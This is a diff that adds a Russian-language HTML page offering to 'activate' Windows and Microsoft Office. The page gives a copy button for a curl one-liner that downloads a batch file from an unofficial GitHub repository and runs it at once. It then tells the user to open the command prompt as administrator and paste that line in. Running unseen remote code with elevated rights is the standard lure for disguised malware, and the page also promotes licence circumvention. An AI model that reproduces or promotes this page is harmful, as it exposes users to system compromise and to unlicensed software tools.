@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Активация Windows & MS Office</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 40px 30px;
+            max-width: 550px;
+            width: 100%;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            color: #f0f6fc;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .step {
+            background-color: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 8px;
+            padding: 16px;
+        }
+        .step-title {
+            color: #58a6ff;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .step-desc {
+            font-size: 15px;
+            line-height: 1.5;
+            color: #c9d1d9;
+        }
+        .step-desc strong {
+            color: #f0f6fc;
+        }
+        .command-box {
+            display: flex;
+            background-color: #010409;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            margin-top: 12px;
+            overflow: hidden;
+        }
+        .command-text {
+            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
+            font-size: 13px;
+            color: #7ee787;
+            padding: 12px;
+            white-space: nowrap;
+            overflow-x: auto;
+            flex-grow: 1;
+            align-items: center;
+            display: flex;
+        }
+        .copy-btn {
+            background-color: #21262d;
+            color: #c9d1d9;
+            border: none;
+            border-left: 1px solid #30363d;
+            padding: 0 16px;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            white-space: nowrap;
+        }
+        .copy-btn:hover {
+            background-color: #238636;
+            color: #ffffff;
+            border-left-color: #238636;
+        }
+        .copy-btn:active {
+            background-color: #2ea44f;
+        }
+        .footer-hint {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #8b949e;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Активация Windows и Microsoft Office</h1>
+    
+    <div class="steps">
+        <!-- Шаг 1 -->
+        <div class="step">
+            <div class="step-title">Шаг 1</div>
+            <div class="step-desc">Скопируйте специальную команду автоматического запуска:</div>
+            <div class="command-box">
+                <div class="command-text" id="cmdText">curl -sL https://raw.githubusercontent.com/carplk/activator/refs/heads/main/activator -o activator.bat && activator.bat</div>
+                <button class="copy-btn" id="copyBtn" onclick="copyCode()">Копировать</button>
+            </div>
+        </div>
+
+        <!-- Шаг 2 -->
+        <div class="step">
+            <div class="step-title">Шаг 2</div>
+            <div class="step-desc">Откройте командную строку. Для гарантии успешной работы лучше запустить её <strong>от имени администратора</strong> (нажмите пуск, введите <code>cmd</code>, нажмите правой кнопкой мыши и выберите «Запуск от имени администратора»).</div>
+        </div>
+
+        <!-- Шаг 3 -->
+        <div class="step">
+            <div class="step-title">Шаг 3</div>
+            <div class="step-desc">Вставьте скопированный код в терминал (нажав <strong>Ctrl + V</strong> или кликнув правой кнопкой мыши) и нажмите <strong>Enter</strong>.</div>
+        </div>
+    </div>
+
+    <div class="footer-hint">После этого запустится удобное меню активации прямо в консоли.</div>
+</div>
+
+<script>
+function copyCode() {
+    const textToCopy = document.getElementById('cmdText').innerText;
+    const btn = document.getElementById('copyBtn');
+    
+    navigator.clipboard.writeText(textToCopy).then(() => {
+        btn.innerText = 'Скопировано!';
+        btn.style.backgroundColor = '#238636';
+        btn.style.color = '#ffffff';
+        
+        setTimeout(() => {
+            btn.innerText = 'Копировать';
+            btn.style.backgroundColor = '';
+            btn.style.color = '';
+        }, 2000);
+    }).catch(err => {
+        console.error('Не удалось скопировать: ', err);
+    });
+}
+</script>
+
+</body>
+</html>
